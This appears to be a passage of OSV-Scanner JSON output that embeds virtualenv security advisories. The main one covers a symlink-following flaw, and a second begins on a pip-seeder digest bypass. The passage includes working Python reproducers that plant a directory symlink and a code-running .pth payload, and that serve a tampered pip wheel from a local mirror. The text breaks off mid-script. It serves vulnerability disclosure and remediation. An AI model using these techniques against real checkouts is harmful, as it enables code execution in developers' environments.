              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-113716](https://osv.dev/CVE-2026-113716)**.\n\n## [GHSA-cw65-gx24-rc82](https://osv.dev/GHSA-cw65-gx24-rc82)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e The builtin creator accepts existing directory symlinks through ensure_dir() and writes environment files through those\n\u003e directories. This permits writes outside the requested destination.\n\u003e \n\u003e Anthropic's OSS Scanner reported this as `ANT-2026-MUFJEG11` in `virtualenv-20261015-005`, received on 15 October 2026.\n\u003e \n\u003e ## Affected area\n\u003e \n\u003e Directory preparation before environment files are created.\n\u003e \n\u003e ## Attacker-controlled input\n\u003e \n\u003e Another account must be able to prepare linked entries below the chosen destination before creation. The invoking user\n\u003e must have access to the linked destination. This does not require write access to the target itself under the other\n\u003e account.\n\u003e \n\u003e ## Affected code\n\u003e \n\u003e The relevant 21.14.8 source is in\n\u003e [builtin creator](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/via_global_ref/builtin/via_global_self_do.py),\n\u003e [ensure_dir()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).\n\u003e \n\u003e ## Mechanism\n\u003e \n\u003e The builtin creator calls `ensure_dir()` for `bin`, `lib`, and package directories. `ensure_dir()` accepts an existing\n\u003e symlink to a directory because `exists()` follows it. Interpreter creation, seed installation, and activation-script\n\u003e generation then write through that parent link. A final-file check cannot prevent a write through a linked parent.\n\u003e `--clear` removes the planted tree first; ordinary creation over a prepared destination reaches it.\n\u003e \n\u003e ## Reproduction and evidence\n\u003e \n\u003e The scanner's project tree contains `venv/bin -\u003e ../../.local/bin` and a `.pth` file in the environment's package tree.\n\u003e With the user's initially empty `~/.local/bin` first on `PATH`, `virtualenv venv` exited successfully and wrote\n\u003e `python*`, `pip*`, and `activate*` into `~/.local/bin`. The marker was absent immediately after creation; a later\n\u003e `pip --version` on the user's `PATH` loaded the seeded environment and the planted `.pth` code wrote the marker. A\n\u003e second case began with the `bin` link resolving inside the environment; replacement of a planted package link during\n\u003e seeding changed where it resolved, and writes again reached `~/.local/bin`.\n\u003e \n\u003e The attacker must prepare entries in an existing destination. The `.pth` content is already attacker-controlled and\n\u003e would run if the user used that environment directly; the added effect is creation-time writing or replacement outside\n\u003e the requested tree and an executable on the user's `PATH` pointing at it. The scanner traces this default builtin path\n\u003e to 20.0.0b1. [PR #3429](https://github.com/pypa/virtualenv/pull/3429) replaces linked directory components before\n\u003e creation. Concurrent parent replacement remains a separate case.\n\u003e \n\u003e ## Attack sequence\n\u003e \n\u003e ```mermaid\n\u003e sequenceDiagram\n\u003e     participant A as Prepared destination\n\u003e     participant V as Builtin creator\n\u003e     participant L as venv/bin symlink\n\u003e     participant H as ~/.local/bin\n\u003e     participant U as User\n\u003e     A-\u003e\u003eL: point to ../../.local/bin\n\u003e     V-\u003e\u003eL: ensure_dir accepts existing directory link\n\u003e     V-\u003e\u003eH: write python, pip and activate files through link\n\u003e     V--\u003e\u003eU: creation reports success\n\u003e     U-\u003e\u003eH: run pip found on PATH\n\u003e     H-\u003e\u003eA: interpreter loads planted .pth\n\u003e     A--\u003e\u003eU: marker created\n\u003e ```\n\u003e \n\u003e ## Reproducer files\n\u003e \n\u003e The following files are from the scanner report for `ANT-2026-MUFJEG11`. They were tested against commit `a857a7823c73`\n\u003e in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\n\u003e need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\n\u003e are included as evidence and were not rerun for this advisory update.\n\u003e \n\u003e **`repro`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e import os\n\u003e import shutil\n\u003e import subprocess\n\u003e import sys\n\u003e from pathlib import Path\n\u003e \n\u003e WORK = Path(\"/tmp/planted-bin-link\")\n\u003e shutil.rmtree(WORK, ignore_errors=True)\n\u003e \n\u003e \n\u003e def user_creates_venv_in_checkout_then_runs_pip(home, make_checkout):\n\u003e     local_bin = home / \".local/bin\"\n\u003e     user_env = {\"HOME\": str(home), \"PATH\": f\"{local_bin}:{os.environ['PATH']}\"}\n\u003e     local_bin_before = set(os.listdir(local_bin))\n\u003e     payload_marker = home / \"PWNED\"\n\u003e \n\u003e     # the attacker's checkout arrives at ~/project\n\u003e     subprocess.run([sys.executable, f\"/tmp/repro.d/{make_checkout}\", home / \"project\"], check=True)\n\u003e     venv = home / \"project/venv\"\n\u003e     print(f\"CONTROL  venv/bin before the run resolves to {os.path.realpath(venv / 'bin')}\")\n\u003e \n\u003e     # default options; the flag only keeps the run off the network\n\u003e     subprocess.run([\"virtualenv\", \"--no-periodic-update\", \"--quiet\", \"venv\"], cwd=home / \"project\", env=user_env, check=True)\n\u003e     written = sorted(set(os.listdir(local_bin)) - local_bin_before)\n\u003e     payload_ran_at_creation = payload_marker.exists()\n\u003e     print(f\"OBSERVED venv/bin after the run resolves to  {os.path.realpath(venv / 'bin')}\")\n\u003e     print(f\"OBSERVED virtualenv wrote to {local_bin}: {written}\")\n\u003e     print(f\"OBSERVED ~/PWNED exists after virtualenv: {payload_ran_at_creation}\")\n\u003e \n\u003e     # later, in another folder, the user runs pip\n\u003e     pip = subprocess.run([\"pip\", \"--version\"], cwd=home, env=user_env, capture_output=True, text=True)\n\u003e     print(f\"OBSERVED pip --version: {(pip.stdout + pip.stderr).strip()}\")\n\u003e     print(f\"OBSERVED ~/PWNED exists after pip: {payload_marker.exists()}\")\n\u003e     return written, payload_marker.exists() and not payload_ran_at_creation\n\u003e \n\u003e \n\u003e print(\"--- checkout_with_bin_link.py: venv/bin -\u003e ../../.local/bin\")\n\u003e home = WORK / \"bin-link\"\n\u003e (home / \".local/bin\").mkdir(parents=True)\n\u003e written_1, pip_ran_payload_1 = user_creates_venv_in_checkout_then_runs_pip(home, \"checkout_with_bin_link.py\")\n\u003e \n\u003e print(\"--- checkout_with_bin_link_staying_inside.py: venv/bin resolves inside venv/ until pip is seeded\")\n\u003e home = WORK / \"bin-link-staying-inside\"\n\u003e (home / \".local/bin\").mkdir(parents=True)\n\u003e # python is linked before the bin link leads out, so the pip written to ~/.local/bin needs the user's own python there\n\u003e (home / \".local/bin/python\").symlink_to(\"/usr/local/bin/python3\")\n\u003e written_2, pip_ran_payload_2 = user_creates_venv_in_checkout_then_runs_pip(home, \"checkout_with_bin_link_staying_inside.py\")\n\u003e \n\u003e # check: virtualenv must write nothing outside ~/project/venv, let alone a pip that runs the checkout's .pth\n\u003e plain_link_followed = {\"pip\", \"activate\"} \u003c= set(written_1) and pip_ran_payload_1\n\u003e link_staying_inside_followed = {\"pip\", \"activate\"} \u003c= set(written_2) and pip_ran_payload_2\n\u003e print(\"---\")\n\u003e print(f\"OBSERVED first checkout: pip, activate written to ~/.local/bin and pip ran the payload: {plain_link_followed}\")\n\u003e print(f\"OBSERVED second checkout: pip, activate written to ~/.local/bin and pip ran the payload: {link_staying_inside_followed}\")\n\u003e print(\"BUG\" if plain_link_followed or link_staying_inside_followed else \"OK\")\n\u003e ```\n\u003e \n\u003e **`repro.d/checkout_with_bin_link.py`**\n\u003e \n\u003e ```text\n\u003e import sys\n\u003e from pathlib import Path\n\u003e \n\u003e venv = Path(sys.argv[1]) / \"venv\"\n\u003e \n\u003e # one per minor version: the attacker does not know which Python the user has\n\u003e for minor in range(9, 20):\n\u003e     site_packages = venv / f\"lib/python3.{minor}/site-packages\"\n\u003e     site_packages.mkdir(parents=True)\n\u003e     (site_packages / \"payload.pth\").write_text(\"import os; open(os.path.expanduser('~/PWNED'), 'w').write(os.getcwd())\\n\")\n\u003e \n\u003e # relative to a checkout at ~/project\n\u003e (venv / \"bin\").symlink_to(\"../../.local/bin\")\n\u003e ```\n\u003e \n\u003e **`repro.d/checkout_with_bin_link_staying_inside.py`**\n\u003e \n\u003e ```text\n\u003e import sys\n\u003e from pathlib import Path\n\u003e \n\u003e venv = Path(sys.argv[1]) / \"venv\"\n\u003e \n\u003e site_packages = venv / \"lib/py/site-packages\"\n\u003e site_packages.mkdir(parents=True)\n\u003e (site_packages / \"payload.pth\").write_text(\"import os; open(os.path.expanduser('~/PWNED'), 'w').write(os.getcwd())\\n\")\n\u003e for minor in range(9, 20):\n\u003e     (venv / f\"lib/python3.{minor}\").symlink_to(\"py\")\n\u003e \n\u003e # pip -\u003e a folder 7 levels below venv/; the real pip folder the seeder puts in its place is only 4 levels below\n\u003e (venv / \"1/2/3/4/5/6/7\").mkdir(parents=True)\n\u003e (site_packages / \"pip\").symlink_to(\"../../../1/2/3/4/5/6/7\")\n\u003e \n\u003e # six levels up from venv/1/2/3/4/5/6/7 is venv/1; six levels up from ~/project/venv/lib/py/site-packages/pip is ~\n\u003e (venv / \"1/.local/bin\").mkdir(parents=True)\n\u003e (venv / \"bin\").symlink_to(\"lib/py/site-packages/pip\" + \"/..\" * 6 + \"/.local/bin\")\n\u003e ```\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Creation can place or replace environment files outside the selected tree. The written bytes are environment-creation\n\u003e output; arbitrary attacker-selected file contents are not established.\n\u003e \n\u003e Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.\n\u003e \n\u003e ## Versions tested\n\u003e \n\u003e The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\n\u003e version or exclude earlier releases. Fixed in 21.14.9.\n\u003e \n\u003e The fix removes pre-existing symbolic links and Windows junctions along executable and library directory paths.\n\u003e Each replacement is created immediately, and an existing entry must be a real directory. A warning names each replaced\n\u003e link or junction. Directories can still be replaced after preparation; this does not protect against concurrent tree\n\u003e replacement.\n\u003e \n\u003e Fix: [PR #3429](https://github.com/pypa/virtualenv/pull/3429).\n\u003e \n\u003e ## Known mitigation\n\u003e \n\u003e Create environments in fresh directories beneath a parent controlled only by their owner. Do not reuse trees prepared by\n\u003e another account.\n\u003e \n\u003e ## Affected release\n\u003e \n\u003e - [x] The problem reproduces on virtualenv 21.14.8.\n\u003e \n\u003e ## Credits\n\u003e \n\u003e Reported by Anthropic's OSS Scanner as ANT-2026-MUFJEG11.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | virtualenv | 20.31.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | virtualenv | 21.7.4 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-cw65-gx24-rc82 | virtualenv | 21.14.9 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113716\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113716\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-113716](https://osv.dev/CVE-2026-113716)**.\n\n## [GHSA-cw65-gx24-rc82](https://osv.dev/GHSA-cw65-gx24-rc82)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e The builtin creator accepts existing directory symlinks through ensure_dir() and writes environment files through those\n\u003e directories. This permits writes outside the requested destination.\n\u003e \n\u003e Anthropic's OSS Scanner reported this as `ANT-2026-MUFJEG11` in `virtualenv-20261015-005`, received on 15 October 2026.\n\u003e \n\u003e ## Affected area\n\u003e \n\u003e Directory preparation before environment files are created.\n\u003e \n\u003e ## Attacker-controlled input\n\u003e \n\u003e Another account must be able to prepare linked entries below the chosen destination before creation. The invoking user\n\u003e must have access to the linked destination. This does not require write access to the target itself under the other\n\u003e account.\n\u003e \n\u003e ## Affected code\n\u003e \n\u003e The relevant 21.14.8 source is in\n\u003e [builtin creator](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/via_global_ref/builtin/via_global_self_do.py),\n\u003e [ensure_dir()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).\n\u003e \n\u003e ## Mechanism\n\u003e \n\u003e The builtin creator calls `ensure_dir()` for `bin`, `lib`, and package directories. `ensure_dir()` accepts an existing\n\u003e symlink to a directory because `exists()` follows it. Interpreter creation, seed installation, and activation-script\n\u003e generation then write through that parent link. A final-file check cannot prevent a write through a linked parent.\n\u003e `--clear` removes the planted tree first; ordinary creation over a prepared destination reaches it.\n\u003e \n\u003e ## Reproduction and evidence\n\u003e \n\u003e The scanner's project tree contains `venv/bin -\u003e ../../.local/bin` and a `.pth` file in the environment's package tree.\n\u003e With the user's initially empty `~/.local/bin` first on `PATH`, `virtualenv venv` exited successfully and wrote\n\u003e `python*`, `pip*`, and `activate*` into `~/.local/bin`. The marker was absent immediately after creation; a later\n\u003e `pip --version` on the user's `PATH` loaded the seeded environment and the planted `.pth` code wrote the marker. A\n\u003e second case began with the `bin` link resolving inside the environment; replacement of a planted package link during\n\u003e seeding changed where it resolved, and writes again reached `~/.local/bin`.\n\u003e \n\u003e The attacker must prepare entries in an existing destination. The `.pth` content is already attacker-controlled and\n\u003e would run if the user used that environment directly; the added effect is creation-time writing or replacement outside\n\u003e the requested tree and an executable on the user's `PATH` pointing at it. The scanner traces this default builtin path\n\u003e to 20.0.0b1. [PR #3429](https://github.com/pypa/virtualenv/pull/3429) replaces linked directory components before\n\u003e creation. Concurrent parent replacement remains a separate case.\n\u003e \n\u003e ## Attack sequence\n\u003e \n\u003e ```mermaid\n\u003e sequenceDiagram\n\u003e     participant A as Prepared destination\n\u003e     participant V as Builtin creator\n\u003e     participant L as venv/bin symlink\n\u003e     participant H as ~/.local/bin\n\u003e     participant U as User\n\u003e     A-\u003e\u003eL: point to ../../.local/bin\n\u003e     V-\u003e\u003eL: ensure_dir accepts existing directory link\n\u003e     V-\u003e\u003eH: write python, pip and activate files through link\n\u003e     V--\u003e\u003eU: creation reports success\n\u003e     U-\u003e\u003eH: run pip found on PATH\n\u003e     H-\u003e\u003eA: interpreter loads planted .pth\n\u003e     A--\u003e\u003eU: marker created\n\u003e ```\n\u003e \n\u003e ## Reproducer files\n\u003e \n\u003e The following files are from the scanner report for `ANT-2026-MUFJEG11`. They were tested against commit `a857a7823c73`\n\u003e in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\n\u003e need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\n\u003e are included as evidence and were not rerun for this advisory update.\n\u003e \n\u003e **`repro`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e import os\n\u003e import shutil\n\u003e import subprocess\n\u003e import sys\n\u003e from pathlib import Path\n\u003e \n\u003e WORK = Path(\"/tmp/planted-bin-link\")\n\u003e shutil.rmtree(WORK, ignore_errors=True)\n\u003e \n\u003e \n\u003e def user_creates_venv_in_checkout_then_runs_pip(home, make_checkout):\n\u003e     local_bin = home / \".local/bin\"\n\u003e     user_env = {\"HOME\": str(home), \"PATH\": f\"{local_bin}:{os.environ['PATH']}\"}\n\u003e     local_bin_before = set(os.listdir(local_bin))\n\u003e     payload_marker = home / \"PWNED\"\n\u003e \n\u003e     # the attacker's checkout arrives at ~/project\n\u003e     subprocess.run([sys.executable, f\"/tmp/repro.d/{make_checkout}\", home / \"project\"], check=True)\n\u003e     venv = home / \"project/venv\"\n\u003e     print(f\"CONTROL  venv/bin before the run resolves to {os.path.realpath(venv / 'bin')}\")\n\u003e \n\u003e     # default options; the flag only keeps the run off the network\n\u003e     subprocess.run([\"virtualenv\", \"--no-periodic-update\", \"--quiet\", \"venv\"], cwd=home / \"project\", env=user_env, check=True)\n\u003e     written = sorted(set(os.listdir(local_bin)) - local_bin_before)\n\u003e     payload_ran_at_creation = payload_marker.exists()\n\u003e     print(f\"OBSERVED venv/bin after the run resolves to  {os.path.realpath(venv / 'bin')}\")\n\u003e     print(f\"OBSERVED virtualenv wrote to {local_bin}: {written}\")\n\u003e     print(f\"OBSERVED ~/PWNED exists after virtualenv: {payload_ran_at_creation}\")\n\u003e \n\u003e     # later, in another folder, the user runs pip\n\u003e     pip = subprocess.run([\"pip\", \"--version\"], cwd=home, env=user_env, capture_output=True, text=True)\n\u003e     print(f\"OBSERVED pip --version: {(pip.stdout + pip.stderr).strip()}\")\n\u003e     print(f\"OBSERVED ~/PWNED exists after pip: {payload_marker.exists()}\")\n\u003e     return written, payload_marker.exists() and not payload_ran_at_creation\n\u003e \n\u003e \n\u003e print(\"--- checkout_with_bin_link.py: venv/bin -\u003e ../../.local/bin\")\n\u003e home = WORK / \"bin-link\"\n\u003e (home / \".local/bin\").mkdir(parents=True)\n\u003e written_1, pip_ran_payload_1 = user_creates_venv_in_checkout_then_runs_pip(home, \"checkout_with_bin_link.py\")\n\u003e \n\u003e print(\"--- checkout_with_bin_link_staying_inside.py: venv/bin resolves inside venv/ until pip is seeded\")\n\u003e home = WORK / \"bin-link-staying-inside\"\n\u003e (home / \".local/bin\").mkdir(parents=True)\n\u003e # python is linked before the bin link leads out, so the pip written to ~/.local/bin needs the user's own python there\n\u003e (home / \".local/bin/python\").symlink_to(\"/usr/local/bin/python3\")\n\u003e written_2, pip_ran_payload_2 = user_creates_venv_in_checkout_then_runs_pip(home, \"checkout_with_bin_link_staying_inside.py\")\n\u003e \n\u003e # check: virtualenv must write nothing outside ~/project/venv, let alone a pip that runs the checkout's .pth\n\u003e plain_link_followed = {\"pip\", \"activate\"} \u003c= set(written_1) and pip_ran_payload_1\n\u003e link_staying_inside_followed = {\"pip\", \"activate\"} \u003c= set(written_2) and pip_ran_payload_2\n\u003e print(\"---\")\n\u003e print(f\"OBSERVED first checkout: pip, activate written to ~/.local/bin and pip ran the payload: {plain_link_followed}\")\n\u003e print(f\"OBSERVED second checkout: pip, activate written to ~/.local/bin and pip ran the payload: {link_staying_inside_followed}\")\n\u003e print(\"BUG\" if plain_link_followed or link_staying_inside_followed else \"OK\")\n\u003e ```\n\u003e \n\u003e **`repro.d/checkout_with_bin_link.py`**\n\u003e \n\u003e ```text\n\u003e import sys\n\u003e from pathlib import Path\n\u003e \n\u003e venv = Path(sys.argv[1]) / \"venv\"\n\u003e \n\u003e # one per minor version: the attacker does not know which Python the user has\n\u003e for minor in range(9, 20):\n\u003e     site_packages = venv / f\"lib/python3.{minor}/site-packages\"\n\u003e     site_packages.mkdir(parents=True)\n\u003e     (site_packages / \"payload.pth\").write_text(\"import os; open(os.path.expanduser('~/PWNED'), 'w').write(os.getcwd())\\n\")\n\u003e \n\u003e # relative to a checkout at ~/project\n\u003e (venv / \"bin\").symlink_to(\"../../.local/bin\")\n\u003e ```\n\u003e \n\u003e **`repro.d/checkout_with_bin_link_staying_inside.py`**\n\u003e \n\u003e ```text\n\u003e import sys\n\u003e from pathlib import Path\n\u003e \n\u003e venv = Path(sys.argv[1]) / \"venv\"\n\u003e \n\u003e site_packages = venv / \"lib/py/site-packages\"\n\u003e site_packages.mkdir(parents=True)\n\u003e (site_packages / \"payload.pth\").write_text(\"import os; open(os.path.expanduser('~/PWNED'), 'w').write(os.getcwd())\\n\")\n\u003e for minor in range(9, 20):\n\u003e     (venv / f\"lib/python3.{minor}\").symlink_to(\"py\")\n\u003e \n\u003e # pip -\u003e a folder 7 levels below venv/; the real pip folder the seeder puts in its place is only 4 levels below\n\u003e (venv / \"1/2/3/4/5/6/7\").mkdir(parents=True)\n\u003e (site_packages / \"pip\").symlink_to(\"../../../1/2/3/4/5/6/7\")\n\u003e \n\u003e # six levels up from venv/1/2/3/4/5/6/7 is venv/1; six levels up from ~/project/venv/lib/py/site-packages/pip is ~\n\u003e (venv / \"1/.local/bin\").mkdir(parents=True)\n\u003e (venv / \"bin\").symlink_to(\"lib/py/site-packages/pip\" + \"/..\" * 6 + \"/.local/bin\")\n\u003e ```\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Creation can place or replace environment files outside the selected tree. The written bytes are environment-creation\n\u003e output; arbitrary attacker-selected file contents are not established.\n\u003e \n\u003e Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.\n\u003e \n\u003e ## Versions tested\n\u003e \n\u003e The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\n\u003e version or exclude earlier releases. Fixed in 21.14.9.\n\u003e \n\u003e The fix removes pre-existing symbolic links and Windows junctions along executable and library directory paths.\n\u003e Each replacement is created immediately, and an existing entry must be a real directory. A warning names each replaced\n\u003e link or junction. Directories can still be replaced after preparation; this does not protect against concurrent tree\n\u003e replacement.\n\u003e \n\u003e Fix: [PR #3429](https://github.com/pypa/virtualenv/pull/3429).\n\u003e \n\u003e ## Known mitigation\n\u003e \n\u003e Create environments in fresh directories beneath a parent controlled only by their owner. Do not reuse trees prepared by\n\u003e another account.\n\u003e \n\u003e ## Affected release\n\u003e \n\u003e - [x] The problem reproduces on virtualenv 21.14.8.\n\u003e \n\u003e ## Credits\n\u003e \n\u003e Reported by Anthropic's OSS Scanner as ANT-2026-MUFJEG11.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | virtualenv | 20.31.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | virtualenv | 21.7.4 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-cw65-gx24-rc82 | virtualenv | 21.14.9 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113716\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113716\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-113716",
              "name": "CVE-2026-113716",
              "properties": {
                "security-severity": "4.5"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-113716: virtualenv: Builtin creation follows linked environment directories",
                "text": "CVE-2026-113716: virtualenv: Builtin creation follows linked environment directories"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-113717",
                "GHSA-cx28-75q4-x26q"
              ],
              "fullDescription": {
                "markdown": "## Summary\n\nThe pip seeder acquires bundled wheels with download=False and lets pip access the index when --download is selected.\nIndex candidates on that path do not pass through virtualenv's wheel digest verification.\n\nAnthropic's OSS Scanner reported this as `ANT-2026-74ALJBUF` in `virtualenv-20261015-005`, received on 15 October 2026.\n\n## Affected area\n\nWheel selection by the pip seeder when downloads are enabled.\n\n## Attacker-controlled input\n\nThe pip seeder and download option must be selected. The finding concerns the default-index digest-verification policy.\nExplicit custom-index settings already opt out of comparison against PyPI metadata; this patch retains that policy.\n\n## Affected code\n\nThe relevant 21.14.8 source is in\n[pip seeder](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/pip_invoke.py).\n\n## Mechanism\n\nWith `--seeder pip --download`, `PipInvoke.get_pip_install_cmd()` first calls `get_wheel(download=False)`, so\nvirtualenv's `download_wheel()` and `verify_wheel_digest()` are skipped. It then lets `pip install` consult the\nconfigured index. An index wheel with the same package and version as the bundled wheel can be selected without\nvirtualenv comparing its SHA-256 with PyPI metadata. The default app-data seeder takes the verification path for the\nsame option.\n\n## Reproduction and evidence\n\nThe scanner built a local index named in `pip.conf` that served a modified copy of the bundled pip wheel under the same\nfilename. In the control run, `virtualenv --download env-default` rejected the wheel with a digest mismatch. In the\nsecond run, adding `--seeder pip` produced an environment whose installed `pip/__init__.py` matched the index wheel;\n`env-pip/bin/pip --version` ran the added line. The reproducer checked the installed bytes and marker before reporting\n`BUG`.\n\nBoth `--seeder pip` and `--download` are needed. The report used a non-PyPI index from `pip.conf` and left\n`PIP_INDEX_URL`, `PIP_EXTRA_INDEX_URL`, and `PIP_INDEX` unset, so virtualenv's default-seeder PyPI comparison remained\nactive. This does not establish index control in the default PyPI setup. The unchecked pip-seeder download path is\nolder, while the comparison with the default seeder arose when digest verification was added in 21.7.12.\n[PR #3430](https://github.com/pypa/virtualenv/pull/3430) acquires and verifies selected wheels before invoking pip with\nindex lookup disabled.\n\n## Attack sequence\n\n```mermaid\nsequenceDiagram\n    participant I as Index in pip.conf\n    participant V as virtualenv PipInvoke\n    participant P as pip install\n    participant E as Seeded environment\n    I-\u003e\u003eV: serve modified pip wheel\n    V-\u003e\u003eV: get_wheel(download=False)\n    V-\u003e\u003eP: install with --download permitting index lookup\n    P-\u003e\u003eI: select same-version index wheel\n    I-\u003e\u003eE: modified pip installed without virtualenv digest check\n    E-\u003e\u003eE: later pip invocation runs added code\n    Note over V,E: Default app-data seeder rejects the same digest\n```\n\n## Reproducer files\n\nThe following files are from the scanner report for `ANT-2026-74ALJBUF`. They were tested against commit `a857a7823c73`\nin the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\nneed a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\nare included as evidence and were not rerun for this advisory update.\n\n**`repro`**\n\n```text\n#!/usr/bin/env python3\nimport glob\nimport hashlib\nimport json\nimport os\nimport shutil\nimport subprocess\nimport sys\nimport zipfile\n\nfrom virtualenv.seed.wheels.embed import get_embed_wheel\n\ncompanions = \"/tmp/repro.d\"\nwork = \"/tmp/repro-pip-seeder-download\"\nshutil.rmtree(work, ignore_errors=True)\nos.makedirs(work)\n\n# set up: the pip wheel virtualenv bundles, and PyPI's record of its sha256 (served by virtualenv_offline.py: no network)\nbundled = get_embed_wheel(\"pip\", f\"{sys.version_info.major}.{sys.version_info.minor}\")\npypi_sha256 = hashlib.sha256(open(bundled.path, \"rb\").read()).hexdigest()\npypi_release = {\"filename\": bundled.name, \"digests\": {\"sha256\": pypi_sha256}}\nos.makedirs(f\"{work}/pypi.org/pypi/pip\")\nwith open(f\"{work}/pypi.org/pypi/pip/json\", \"w\") as pypi_json:\n    json.dump({\"releases\": {bundled.version: [pypi_release]}}, pypi_json)\n\n# attacker: the mirror serves other bytes under the bundled wheel's own file name\nmarker = f\"{work}/MIRROR_CODE_RAN\"\nsubprocess.run([sys.executable, f\"{companions}/make_mirror.py\", str(bundled.path), f\"{work}/mirror\", marker], check=True)\nmirror_wheel = f\"{work}/mirror/pip/{bundled.name}\"\nmirror_sha256 = hashlib.sha256(open(mirror_wheel, \"rb\").read()).hexdigest()\nprint(f\"{bundled.name}: PyPI publishes sha256 {pypi_sha256}\")\nprint(f\"{bundled.name}: the mirror serves  sha256 {mirror_sha256}\")\n\n# user: pip.conf names the mirror; PIP_INDEX_URL, PIP_EXTRA_INDEX_URL and PIP_INDEX (which turn the check off) are unset\nwith open(f\"{work}/pip.conf\", \"w\") as pip_conf:\n    pip_conf.write(f\"[global]\\nindex-url = file://{work}/mirror\\n\")  # file:// stands in for the mirror's http URL\nos.makedirs(f\"{work}/home-default\")\nos.makedirs(f\"{work}/home-pip\")  # one HOME per run, so neither sees the other's app-data or pip cache\nvirtualenv = [sys.executable, f\"{companions}/virtualenv_offline.py\", f\"{work}/pypi.org\", \"--no-periodic-update\"]\n\n# control: the default seeder with --download fetches the mirror's wheel and refuses it\ndefault_seeder = subprocess.run(\n    [*virtualenv, \"--download\", f\"{work}/env-default\"],\n    env={**os.environ, \"HOME\": f\"{work}/home-default\", \"PIP_CONFIG_FILE\": f\"{work}/pip.conf\"},\n    capture_output=True,\n    text=True,\n)\nrefusal = [line for line in default_seeder.stdout.splitlines() if line.startswith(\"RuntimeError: \")]\nprint(f\"\\nCONTROL  virtualenv --download env-default: exit {default_seeder.returncode}\")\nprint(\"\\n\".join(refusal))\n\n# trigger: the same command plus --seeder pip\npip_seeder = subprocess.run(\n    [*virtualenv, \"--download\", \"--seeder\", \"pip\", f\"{work}/env-pip\"],\n    env={**os.environ, \"HOME\": f\"{work}/home-pip\", \"PIP_CONFIG_FILE\": f\"{work}/pip.conf\"},\n    capture_output=True,\n    text=True,\n)\nprint(f\"\\nOBSERVED virtualenv --download --seeder pip env-pip: exit {pip_seeder.returncode}\")\nprint(pip_seeder.stdout)\nif pip_seeder.returncode == 0:\n    env_pip = subprocess.run([f\"{work}/env-pip/bin/pip\", \"--version\"], capture_output=True, text=True, check=True)\n    print(f\"$ env-pip/bin/pip --version\\n{env_pip.stdout}\")\n\n# check: 